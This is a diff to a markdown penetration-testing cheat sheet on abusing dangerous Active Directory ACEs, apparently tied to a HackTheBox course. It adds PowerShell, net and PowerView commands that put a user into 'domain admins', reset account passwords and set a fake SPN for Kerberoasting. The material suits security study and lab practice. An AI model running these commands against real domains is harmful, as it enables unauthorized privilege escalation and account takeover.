@@ -292,18 +292,53 @@ You should use [BloodHound](/cybersecurity/red-team/tools/utilities/windows/bloo
 
 <br>
 
+#### Dangerous ACEs — Exploitation
+
+[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+Some commands require a password or a credential object:
+
+```ps
+PS> $pass = ConvertTo-SecureString -AsPlainText "old" -Force
+PS> $Creds = New-Object System.Management.Automation.PSCredential('domain\username', $pass) 
+```
+
+* NET Commands
+
+```ps
+PS> net group "domain admins" <username> /add /domain # add to group
+```
+
+* Active Directory PowerShell Module Commands
+
+```ps
+PS> Set-ADAccountPassword -Identity username -OldPassword $pass -NewPassword $pass
+```
+
+* PowerView Commands
+
+```ps
+PS> Set-DomainUserPassword -Identity username -AccountPassword $pass -Credential $Cred -Verbose
+PS> Add-DomainGroupMember -Identity "domain admins" -Members 'username' -Credential $Cred -Verbose
+PS> Remove-DomainGroupMember -Identity "domain admins" -Members 'username' -Credential $Cred -Verbose # Remove
+PS> Set-DomainObject -Credential $Cred -Identity username -SET @{serviceprincipalname='xxx/yyy'} -Verbose # fake SPN
+PS> Set-DomainObject -Credential $Cred -Identity username -Clear serviceprincipalname -Verbose # Remove SPN
+```
+</div><div>
+
 #### Dangerous ACEs — GenericWrite
 
 [![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 
-We can add ourselves in another group that we may leverage to escalate through the domain.
+We can add ourselves in another group such as `IT` below, that we may leverage to escalate through the domain.
 
 ```yaml!
 AceType: AccessAllowed
 ObjectDN: CN=IT,OU=[...]
 ActiveDirectoryRights: [...], GenericWrite
 ```
-</div><div>
+
+<br>
 
 #### Dangerous ACEs — ForceChangePassword
 
